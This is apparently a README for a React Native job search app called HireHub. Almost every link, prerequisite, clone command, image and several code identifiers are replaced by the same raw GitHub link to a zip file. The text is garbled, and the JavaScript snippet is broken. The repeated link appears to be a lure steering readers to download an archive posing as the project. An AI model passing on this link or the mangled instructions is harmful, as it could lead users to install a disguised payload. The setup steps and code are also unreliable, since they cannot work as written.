<div align="center"> 

<h3>📱 A modern job search app built with React Native and Expo</h3> </div>
📌 Table of Contents
📖 Overview

⚙️ Tech Stack

✨ Features

🚀 Getting Started

🖼️ Snippets

📎 Resources

🙌 Contributing

📖 Overview
HireHub is a feature-rich React Native application designed to help users find jobs with ease. Whether you're exploring nearby opportunities or searching for specific job titles, HireHub has you covered with a responsive UI and seamless API integration.

Watch the full tutorial and learn to build this app on JavaScript Mastery YouTube

⚙️ Tech Stack
React Native (Expo)

https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip

Axios

RapidAPI - JSearch

Custom React Hooks

Expo Router & Navigation

✨ Features
✅ Beautiful & Responsive UI
✅ Browse Jobs by Category or Location
✅ Search with Pagination
✅ Custom API Integration via RapidAPI
✅ Detailed Job Descriptions
✅ Reusable Components & Hooks
✅ Error Handling & Loaders
✅ Optimized for Mobile Devices

🚀 Getting Started
Prerequisites
Make sure you have the following installed:

https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip

Expo CLI

Git

RapidAPI account

Installation Steps
bash
Copy code
# Clone the repository
git clone https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip
cd hirehub

# Install dependencies
npm install
Setup Environment
Create a .env file in the root directory and add your RapidAPI key:

env
Copy code
X-RapidAPI-Key=your_key_here
Run the App
bash
Copy code
npm start
Scan the QR code with Expo Go to view the app on your device.

![Home page](https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip)

![Home Job](https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip)

![Job Discription](https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip)

![Google jov](https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip)

🖼️ Snippets
<details> <summary><code>https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip</code></summary>
js
Copy code
useEffect(() => {
  const fetchJobs = async () => {
    setSearchLoader(true);
    try {
      const response = await https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip("https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip", {
        params: { query: https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip, page: page },
        headers: {
          "X-RapidAPI-Key": https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip,
          "X-RapidAPI-Host": "https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip"
        }
      });
      setSearchResult(https://raw.githubusercontent.com/vedant007-v/hire_hub/main/plerotic/hire_hub.zip);
    } catch (error) {
      setSearchError(true);
    } finally {
      setSearchLoader(false);
    }
  };
  fetchJobs();
}, [page]);
</details>